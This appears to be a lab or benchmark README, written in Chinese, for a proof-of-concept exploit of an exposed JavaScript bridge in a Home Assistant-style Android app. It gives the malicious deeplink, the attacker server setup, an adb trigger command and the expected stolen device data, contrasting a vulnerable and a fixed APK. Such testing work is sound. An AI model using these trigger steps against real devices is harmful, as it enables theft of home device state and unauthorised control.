# EXP: 1.1 Improper Exposure of JavaScript Bridge

## 漏洞概述

Home Assistant WebView 通过 `addJavascriptInterface` 暴露了 `HomeAppBridge`，该 Bridge 包含 `getDeviceState()` 和 `sendCommand()` 方法，且未限制调用来源。攻击者通过 Deeplink 加载恶意页面即可窃取设备状态并执行未授权控制指令。

## 触发方式

```
homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.1
```

> **注意:** `<HOST_IP>` 取决于模拟器类型。MuMu 模拟器使用宿主机 LAN IP（如 `10.15.31.28`），Android 官方模拟器使用 `10.0.2.2`。启动 `server.py` 时会自动检测并显示正确的 IP。

## 启动服务

```bash
cd exp/home-assistant/1.1_Improper_Exposure_of_JavaScript_Bridge
python server.py
# 输出示例:
# [*] 本机IP地址: 10.15.31.28
# [*] 攻击页面: http://10.15.31.28:8000/exp/1.1
# [*] Deeplink: homeassistant://webview?url=http://10.15.31.28:8000/exp/1.1
```

## 验证步骤

1. 清空旧数据: `rm -rf received/*`
2. 启动服务器: `python server.py`
3. ADB 触发:
   ```
   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.1"
   ```
4. 等待 3-5 秒后检查 `received/` 目录:
   - **Vuln APK**: 应收到 `summary=done bridge=true` 以及设备状态数据（`device_lock.front_door`, `cmd` 等）
   - **Fix APK**: 只收到 `ping` 和 `summary=done bridge=false`，不能访问 Bridge 和泄露设备数据
